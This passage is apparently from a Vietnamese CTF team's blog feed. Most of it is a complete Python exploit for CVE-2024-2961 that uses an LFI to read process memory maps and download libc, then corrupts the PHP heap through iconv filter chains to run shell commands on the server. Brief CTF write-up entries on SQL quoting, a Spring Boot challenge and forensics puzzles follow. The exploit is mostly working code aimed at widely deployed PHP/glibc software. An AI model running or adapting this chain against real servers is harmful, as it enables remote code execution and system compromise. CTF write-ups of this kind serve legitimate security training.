&lt;li&gt;Sau đây sẽ là PWN CORE , mình đéo biết giải thích như nào nên chạy code thôi ; Vào &lt;code&gt;http://localhost:5000/&lt;/code&gt; để check id&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-php=" data-lang="php="&gt;import requests
from pwn import *
import re
import base64
import zlib
from bs4 import BeautifulSoup
session = requests.Session()
## Constant
HEAP_SIZE = 2 * 1024 * 1024
BUG = &amp;#34;劄&amp;#34;.encode(&amp;#34;utf-8&amp;#34;)
## Post init function
def get_file(url, path):
path = f&amp;#34;php://filter/convert.base64-encode/resource={path}&amp;#34;
r = session.post(url + &amp;#39;login.php&amp;#39;, data={&amp;#39;username&amp;#39;:&amp;#39;winky&amp;#39;})
r = session.post(url + &amp;#39;index.php&amp;#39;, data={&amp;#39;note&amp;#39;:path})
r = session.post(url + &amp;#39;/premium.php/index.php&amp;#39;, data={&amp;#39;color&amp;#39;: &amp;#39;SplFileObject&amp;#39;})
r = session.get(url + &amp;#39;index.php&amp;#39;)
soup = BeautifulSoup(r.text, &amp;#34;html.parser&amp;#34;)
data = soup.find(&amp;#34;div&amp;#34;, id=&amp;#34;noteContent&amp;#34;).get_text(strip=True)
return base64.b64decode(data)
def compress(data):
return zlib.compress(data, 9)[2:-4]
def compressed_bucket(data):
return chunked_chunk(data, 0x8000)
def qpe(data):
return &amp;#34;&amp;#34;.join(f&amp;#34;={x:02x}&amp;#34; for x in data).upper().encode()
def ptr_bucket(*ptrs, size=None):
if size is not None:
assert len(ptrs) * 8 == size
bucket = b&amp;#34;&amp;#34;.join(map(p64, ptrs))
bucket = qpe(bucket)
bucket = chunked_chunk(bucket)
bucket = chunked_chunk(bucket)
bucket = chunked_chunk(bucket)
bucket = compressed_bucket(bucket)
return bucket
def chunked_chunk(data, size: int = None):
if size is None:
size = len(data) + 8
keep = len(data) + len(b&amp;#34;\n\n&amp;#34;)
size = f&amp;#34;{len(data):x}&amp;#34;.rjust(size - keep, &amp;#34;0&amp;#34;)
return size.encode() + b&amp;#34;\n&amp;#34; + data + b&amp;#34;\n&amp;#34;
## Pwn core
class PWN_Core():
def __init__(self, url, command) -&amp;gt; None:
self.url = url
self.command = command
self.info = {}
self.heap = None
self.pad = 20
class Region():
def __init__(self, start, stop, permissions, path):
self.start = int(start)
self.stop = int(stop)
self.permissions = permissions
self.path = path
@property
def size(self) -&amp;gt; int:
return self.stop - self.start
def download_file(self, remote_path: str, local_path: str) -&amp;gt; None:
data = get_file(self.url, remote_path)
Path(local_path).write_bytes(data)
def get_regions(self):
maps = get_file(self.url, &amp;#34;/proc/self/maps&amp;#34;)
maps = maps.decode()
PATTERN = re.compile(
r&amp;#34;^([a-f0-9]+)-([a-f0-9]+)\b&amp;#34; r&amp;#34;.*&amp;#34; r&amp;#34;\s([-rwx]{3}[ps])\s&amp;#34; r&amp;#34;(.*)&amp;#34;
)
regions = []
for region in [line.strip() for line in maps.strip().split(&amp;#39;\n&amp;#39;)]:
if match := PATTERN.match(region):
start = int(match.group(1), 16)
stop = int(match.group(2), 16)
permissions = match.group(3)
path = match.group(4)
if &amp;#34;/&amp;#34; in path or &amp;#34;[&amp;#34; in path:
path = path.rsplit(&amp;#34; &amp;#34;, 1)[-1]
else:
path = &amp;#34;&amp;#34;
current = self.Region(start, stop, permissions, path)
regions.append(current)
else:
print(maps)
return regions
def _get_region(self, regions: list[Region], *names: str) -&amp;gt; Region:
for region in regions:
if any(name in region.path for name in names):
break
return region
def find_main_heap(self, regions):
heaps = [
region.stop - HEAP_SIZE + 0x40
for region in reversed(regions)
if region.permissions == &amp;#34;rw-p&amp;#34;
and region.size &amp;gt;= HEAP_SIZE
and region.stop &amp;amp; (HEAP_SIZE-1) == 0
and region.path in (&amp;#34;&amp;#34;, &amp;#34;[anon:zend_alloc]&amp;#34;)
]
first = heaps[0]
if len(heaps) &amp;gt; 1:
heaps = &amp;#34;, &amp;#34;.join(map(hex, heaps))
return first
def get_symbols_and_addresses(self) -&amp;gt; None:
regions = self.get_regions()
LIBC_FILE = &amp;#34;./libc&amp;#34;
self.info[&amp;#34;heap&amp;#34;] = self.find_main_heap(regions)
libc = self._get_region(regions, &amp;#34;libc-&amp;#34;, &amp;#34;libc.so&amp;#34;)
self.download_file(libc.path, LIBC_FILE)
self.info[&amp;#34;libc&amp;#34;] = ELF(LIBC_FILE, checksec=False)
self.info[&amp;#34;libc&amp;#34;].address = libc.start
def build_exploit_path(self):
self.get_symbols_and_addresses()
LIBC = self.info[&amp;#34;libc&amp;#34;]
ADDR_EMALLOC = LIBC.symbols[&amp;#34;__libc_malloc&amp;#34;]
ADDR_EFREE = LIBC.symbols[&amp;#34;__libc_system&amp;#34;]
ADDR_EREALLOC = LIBC.symbols[&amp;#34;__libc_realloc&amp;#34;]
ADDR_HEAP = self.info[&amp;#34;heap&amp;#34;]
ADDR_FREE_SLOT = ADDR_HEAP + 0x20
ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
CS = 0x100
pad_size = CS - 0x18
pad = b&amp;#34;\x00&amp;#34; * pad_size
pad = chunked_chunk(pad, len(pad) + 6)
pad = chunked_chunk(pad, len(pad) + 6)
pad = chunked_chunk(pad, len(pad) + 6)
pad = compressed_bucket(pad)
step1_size = 1
step1 = b&amp;#34;\x00&amp;#34; * step1_size
step1 = chunked_chunk(step1)
step1 = chunked_chunk(step1)
step1 = chunked_chunk(step1, CS)
step1 = compressed_bucket(step1)
step2_size = 0x48
step2 = b&amp;#34;\x00&amp;#34; * (step2_size + 8)
step2 = chunked_chunk(step2, CS)
step2 = chunked_chunk(step2)
step2 = compressed_bucket(step2)
step2_write_ptr = b&amp;#34;0\n&amp;#34;.ljust(step2_size, b&amp;#34;\x00&amp;#34;) + p64(ADDR_FAKE_BIN)
step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
step2_write_ptr = chunked_chunk(step2_write_ptr)
step2_write_ptr = compressed_bucket(step2_write_ptr)
step3_size = CS
step3 = b&amp;#34;\x00&amp;#34; * step3_size
assert len(step3) == CS
step3 = chunked_chunk(step3)
step3 = chunked_chunk(step3)
step3 = chunked_chunk(step3)
step3 = compressed_bucket(step3)
step3_overflow = b&amp;#34;\x00&amp;#34; * (step3_size - len(BUG)) + BUG
assert len(step3_overflow) == CS
step3_overflow = chunked_chunk(step3_overflow)
step3_overflow = chunked_chunk(step3_overflow)
step3_overflow = chunked_chunk(step3_overflow)
step3_overflow = compressed_bucket(step3_overflow)
step4_size = CS
step4 = b&amp;#34;=00&amp;#34; + b&amp;#34;\x00&amp;#34; * (step4_size - 1)
step4 = chunked_chunk(step4)
step4 = chunked_chunk(step4)
step4 = chunked_chunk(step4)
step4 = compressed_bucket(step4)
step4_pwn = ptr_bucket(
0x200000,
0,
# free_slot
0,
0,
ADDR_CUSTOM_HEAP, # 0x18
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
ADDR_HEAP, # 0x140
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
size=CS,
)
step4_custom_heap = ptr_bucket(
ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
)
step4_use_custom_heap_size = 0x140
COMMAND = self.command
COMMAND = f&amp;#34;kill -9 $PPID; {COMMAND}&amp;#34;
COMMAND = COMMAND.encode() + b&amp;#34;\x00&amp;#34;
COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&amp;#34;\x00&amp;#34;)
step4_use_custom_heap = COMMAND
step4_use_custom_heap = qpe(step4_use_custom_heap)
step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
pages = (
step4 * 3
+ step4_pwn
+ step4_custom_heap
+ step4_use_custom_heap
+ step3_overflow
+ pad * self.pad
+ step1 * 3
+ step2_write_ptr
+ step2 * 2
)
resource = compress(compress(pages))
resource = base64.b64encode(resource).decode()
resource = f&amp;#34;data:text/plain;base64,{resource}&amp;#34;
filters = [
# Create buckets
&amp;#34;zlib.inflate&amp;#34;,
&amp;#34;zlib.inflate&amp;#34;,
# Step 0: Setup heap
&amp;#34;dechunk&amp;#34;,
&amp;#34;convert.iconv.L1.L1&amp;#34;,
# Step 1: Reverse FL order
&amp;#34;dechunk&amp;#34;,
&amp;#34;convert.iconv.L1.L1&amp;#34;,
# Step 2: Put fake pointer and make FL order back to normal
&amp;#34;dechunk&amp;#34;,
&amp;#34;convert.iconv.L1.L1&amp;#34;,
# Step 3: Trigger overflow
&amp;#34;dechunk&amp;#34;,
&amp;#34;convert.iconv.UTF-8.ISO-2022-CN-EXT&amp;#34;,
# Step 4: Allocate at arbitrary address and change zend_mm_heap
&amp;#34;convert.quoted-printable-decode&amp;#34;,
&amp;#34;convert.iconv.L1.L1&amp;#34;,
]
filters = &amp;#34;|&amp;#34;.join(filters)
path = f&amp;#34;php://filter/read={filters}/resource={resource}&amp;#34;
return path
def solve():
URL = &amp;#39;http://localhost:5000/&amp;#39;
command = &amp;#39;id &amp;gt; /tmp/check_id&amp;#39;
print(f&amp;#39;[+] Build payload với lệnh: {command}&amp;#39;)
path = PWN_Core(URL, command).build_exploit_path()
# 2. Gửi Exploit (Chấp nhận lỗi 502/Server Crash)
try:
print(&amp;#39;[*] Đang gửi payload kích hoạt RCE...&amp;#39;)
# Bước này server có thể trả về 502 do tiến trình crash, ta dùng try/except để bỏ qua lỗi
# Lưu ý: Không gọi get_file ở đây để đọc kết quả ngay, vì hàm get_file sẽ fail khi parse HTML lỗi
# Tự gửi request thủ công để tránh logic parse HTML của hàm get_file
exploit_payload = f&amp;#34;php://filter/convert.base64-encode/resource={path}&amp;#34;
session.post(URL + &amp;#39;login.php&amp;#39;, data={&amp;#39;username&amp;#39;:&amp;#39;winky&amp;#39;})
session.post(URL + &amp;#39;index.php&amp;#39;, data={&amp;#39;note&amp;#39;: exploit_payload})
session.post(URL + &amp;#39;/premium.php/index.php&amp;#39;, data={&amp;#39;color&amp;#39;: &amp;#39;SplFileObject&amp;#39;})
session.get(URL + &amp;#39;index.php&amp;#39;, timeout=5) # Kích hoạt exploit
except Exception as e:
# Lỗi 502 hoặc timeout là dấu hiệu tốt (server đang xử lý/crash do exploit)
print(f&amp;#39;[!] Server phản hồi/crash (điều này là bình thường với CVE-2024-2961): {e}&amp;#39;)
# 3. Đợi hệ thống đồng bộ file
import time
print(&amp;#39;[*] Đợi 2 giây để lệnh thực thi xong...&amp;#39;)
time.sleep(2)
# 4. Đọc kết quả từ file /tmp/check_id bằng LFI (Sử dụng lại hàm get_file)
print(&amp;#39;[*] Đang đọc kết quả từ /tmp/check_id...&amp;#39;)
try:
# Dùng chính tính năng SplFileObject để đọc file kết quả
result = get_file(URL, &amp;#34;/tmp/check_id&amp;#34;)
if result:
print(&amp;#39;\n[+] KẾT QUẢ COMMAND ID:&amp;#39;)
print(&amp;#39;=&amp;#39;*40)
print(result.decode(&amp;#39;utf-8&amp;#39;).strip())
print(&amp;#39;=&amp;#39;*40)
else:
print(&amp;#39;[-] Không đọc được kết quả. Có thể exploit chưa thành công.&amp;#39;)
except Exception as e:
print(f&amp;#39;[-] Lỗi khi đọc file kết quả: {e}&amp;#39;)
if __name__ == &amp;#34;__main__&amp;#34;:
solve()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SyU18T4I-g.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/0xl4ugh/featured.png"/></item><item><title>PACKAGES</title><link>https://mtasecurity.github.io/MSEC/web/1762867950463-web/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1762867950463-web/</guid><description>&lt;h1 class="relative group"&gt;PACKAGES
&lt;div id="packages" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#packages" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Sy32vseeWx.png"
&gt;&lt;/figure&gt;
&lt;a
href="https://packages.challs.pwnoh.io/"
target="_blank"
&gt;https://packages.challs.pwnoh.io/&lt;/a&gt;&lt;/p&gt;
&lt;h3 class="relative group"&gt;Phân tích source
&lt;div id="phân-tích-source" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ph%c3%a2n-t%c3%adch-source" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SyyEhilxZx.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;&lt;code&gt;main.py&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;distro &lt;span style="color:#f92672"&gt;=&lt;/span&gt; request.&lt;span style="color:#a6e22e"&gt;args&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;get&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;distro&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;).&lt;span style="color:#a6e22e"&gt;strip&lt;/span&gt;().&lt;span style="color:#a6e22e"&gt;lower&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;package&lt;/span&gt; &lt;span style="color:#960050;background-color:#1e0010"&gt;= &lt;/span&gt;request.args.get(&lt;span style="color:#e6db74"&gt;&amp;#34;package&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;).&lt;span style="color:#a6e22e"&gt;strip&lt;/span&gt;().&lt;span style="color:#a6e22e"&gt;lower&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sql &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;SELECT distro, distro_version, package, package_version FROM packages&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; distro or package:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sql &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34; WHERE &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; distro:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sql &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; f&lt;span style="color:#e6db74"&gt;&amp;#34;LOWER(distro) = {json.dumps(distro)}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; distro and package:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sql &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34; AND &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; package:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sql &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; f&lt;span style="color:#e6db74"&gt;&amp;#34;LOWER(package) = {json.dumps(package)}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sql &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34; ORDER BY distro, distro_version, package&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(sql)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;results &lt;span style="color:#f92672"&gt;=&lt;/span&gt; db.&lt;span style="color:#a6e22e"&gt;execute&lt;/span&gt;(sql).&lt;span style="color:#a6e22e"&gt;fetchall&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;author dùng &lt;code&gt;json.dump&lt;/code&gt; để quote tham số người dùng khi ghép chuỗi SQL&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Giải thích về &lt;code&gt;json.dump&lt;/code&gt; trong python&lt;/strong&gt;
&lt;code&gt;json.dump&lt;/code&gt; được sử dụng để serialize một object python (vd: dictionary, list, tuple, string, int, float, bool, , None) thành định dạng JSON và viết trực tiếp vào một file hoặc file-like object.
module: cần &lt;code&gt;import json&lt;/code&gt; để sử dụng&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1762867950463-web/featured.png"/></item><item><title>PortfolioS</title><link>https://mtasecurity.github.io/MSEC/web/1761292330570-aaa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1761292330570-aaa/</guid><description>&lt;h1 class="relative group"&gt;PortfolioS
&lt;div id="portfolios" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#portfolios" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Hk5zfaOCee.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;Challenge file: &lt;a
href="https://drive.google.com/file/d/1g-ZEzFmsgxozcKSScCvevPqiFS4w4Bgh/view"
target="_blank"
&gt;public.zip&lt;/a&gt;&lt;/p&gt;
&lt;h2 class="relative group"&gt;1) Phân tích challenge
&lt;div id="1-phân-tích-challenge" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#1-ph%c3%a2n-t%c3%adch-challenge" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;h3 class="relative group"&gt;1.1 Kiến trúc (Docker Compose + mạng)
&lt;div id="11-kiến-trúc-docker-compose--mạng" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#11-ki%e1%ba%bfn-tr%c3%bac-docker-compose--m%e1%ba%a1ng" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Hệ thống có 2 service:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;app&lt;/strong&gt;: Spring Boot (Tomcat embedded)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nginx&lt;/strong&gt;: reverse proxy expose cổng &lt;strong&gt;8989&lt;/strong&gt; ra host, &lt;code&gt;proxy_pass http://app:8989&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Mọi truy cập từ ngoài đi &lt;strong&gt;qua nginx&lt;/strong&gt; rồi mới tới app.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rkTvGp_Rle.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SJ4OMad0el.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Syu_Gp_Rle.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/r1ZEET_0xg.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/H1oMNauCgl.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1761292330570-aaa/featured.png"/></item><item><title>V1T CTF CHALLENGES</title><link>https://mtasecurity.github.io/MSEC/for/1762190348580-for/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/for/1762190348580-for/</guid><description>&lt;p&gt;V1T CTF CHALLENGES&lt;/p&gt;
&lt;p&gt;MISC: MOOO (maybe Crypto &amp;amp; Forensics)&lt;/p&gt;
&lt;p&gt;Đề bài cho ta tải 1 file .jpeg, trong file ảnh là một con bò (cảm giác như sắp bị dắt giống bài TrynaCrack)&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Syyl_S8kWl.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rkKfurUybx.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SkIVdH81Ze.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Sau khi đẩy file ảnh vào kali và sử dụng lệnh exiftool thì ta ra một cái comment dài như đường đến trái tim crush vậy&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Vì đã từng làm qua một bài Crypto liên quan đến mật mã Moo này nên tôi đã copy toàn bộ phần comment và sử dụng &lt;a
href="https://www.jdoodle.com/execute-cow-online"
target="_blank"
&gt;https://www.jdoodle.com/execute-cow-online&lt;/a&gt; để decode và được kết quả như bên dưới
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/S1KBFSIk-g.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/for/1762190348580-for/featured.png"/></item><item><title>V1T CTF CHALLENGES</title><link>https://mtasecurity.github.io/MSEC/for/1762190355184-for/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/for/1762190355184-for/</guid><description>&lt;p&gt;&lt;strong&gt;V1T CTF CHALLENGES&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;From: VN_MSEC&lt;/p&gt;
&lt;p&gt;Đây là 1 thử thách thuộc giải V1T CTF, liên quan đến crack file zip, sau đó sửa 1 ảnh trong file đó và có gợi ý liên quan đến flag&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CRACK FILE&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Sau khi tải file challenge.zip của giải về, ta sẽ có 1 file trong đó chưa file quackquackquack.png nhưng không thể mở được (đương nhiên rồi vì đề bài yêu cầu ta crack nó)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/ry6354Lk-x.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/for/1762190355184-for/featured.png"/></item><item><title>Write-up CSCV2025 final FOR challenges</title><link>https://mtasecurity.github.io/MSEC/for/1763441741306-for/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/for/1763441741306-for/</guid><description>&lt;h1 class="relative group"&gt;CSCV2025-FINAL-WRITEUP
&lt;div id="cscv2025-final-writeup" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cscv2025-final-writeup" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;This is write up for challenge Another Day (Forensics) in CSCV2025 FINAL&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;From: MTA.SUPPORT (Military Technical Academy)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Hi everyone, last Sunday, I have done this Forensics challenge in Cybersecurity Contest Vietnam 2025 Final, so that today I want to share you the way to solve this challenge&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;ol&gt;
&lt;li&gt;Analysis file&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;First, I download the file and unzip with the pass gave by author. After that, I get a challenge.ad1 file so that I gonna put it in a tool I really like, it is FTK Imager
&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/for/1763441741306-for/featured.png"/></item><item><title>Write-up CSCV2025 final FOR challenges (CASECHARLIE)</title><link>https://mtasecurity.github.io/MSEC/for/1763999496790-for/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/for/1763999496790-for/</guid><description>&lt;h1 class="relative group"&gt;CSCV2025-FINAL-WRITEUP-CASECHARLIE
&lt;div id="cscv2025-final-writeup-casecharlie" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cscv2025-final-writeup-casecharlie" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;This is write up for challenge Case Charlie (Forensics) in CSCV2025 FINAL&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;From MTA.SUPPORT (Military Technical Academy)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Hi everyone, last Saturday I have solved this forensics challenge in the final round of Cybersecurity Contest Viet Nam 2025. Today, I will tell you how to solve this 400 points challenge.&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;&lt;strong&gt;1, Preparation&lt;/strong&gt;&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/for/1763999496790-for/featured.png"/></item><item><title>Write-up CSCV2025 final REV challenges</title><link>https://mtasecurity.github.io/MSEC/re/1763441748872-re/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/re/1763441748872-re/</guid><description>&lt;p&gt;Hello everyone! After taking a short break, today I will continue by writing about some of the challenges I solved in CSCV2025 competition UwU !&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. BabyAPK&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;+ Decription:&lt;/strong&gt;
